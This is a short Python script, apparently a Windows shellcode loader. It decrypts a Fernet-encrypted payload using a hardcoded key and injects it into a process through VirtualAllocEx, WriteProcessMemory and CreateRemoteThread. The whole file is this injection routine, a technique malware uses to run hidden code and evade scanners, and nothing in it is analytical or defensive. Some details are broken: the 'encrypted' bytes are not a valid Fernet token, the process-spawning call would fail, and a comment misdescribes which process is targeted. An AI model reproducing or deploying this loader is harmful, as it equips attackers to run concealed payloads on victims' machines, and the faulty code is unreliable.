from cryptography.fernet import Fernet
from ctypes import *
from ctypes.wintypes import *
import subprocess

# Define constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = -1

# Define functions from Windows API
OpenProcess = windll.kernel32.OpenProcess
VirtualAllocEx = windll.kernel32.VirtualAllocEx
WriteProcessMemory = windll.kernel32.WriteProcessMemory
CreateRemoteThread = windll.kernel32.CreateRemoteThread
WaitForSingleObject = windll.kernel32.WaitForSingleObject
CloseHandle = windll.kernel32.CloseHandle

# Define the encryption key and create a Fernet instance
key = b'Dp3fafvz-bfrS4v1kc7APsNlHMI14q_v8UVtZ6XIWko='
cipher = Fernet(key)

# Define the encrypted content as bytes
encrypted_data = b'\x80?\x1f\x05\xb8\x13\xd3\xf3\x90\xd2\x88\xfc\x8f\xe3\xcc\x0c'

# Decrypt the content
decrypted_data = cipher.decrypt(encrypted_data)

# Get the process ID of the current process
pid = subprocess.Popen("", stdout=subprocess.PIPE, stderr=subprocess.PIPE).pid

# Open the process with all access rights
hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# Allocate memory in the remote process
addr = VirtualAllocEx(hProcess, None, len(decrypted_data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

# Write the decrypted content to the allocated memory
WriteProcessMemory(hProcess, addr, decrypted_data, len(decrypted_data), None)

# Create a remote thread that executes the decrypted content
hThread = CreateRemoteThread(hProcess, None, 0, addr, None, 0, None)

# Wait for the thread to finish
WaitForSingleObject(hThread, INFINITE)

# Close the thread and process handles
CloseHandle(hThread)
CloseHandle(hProcess)
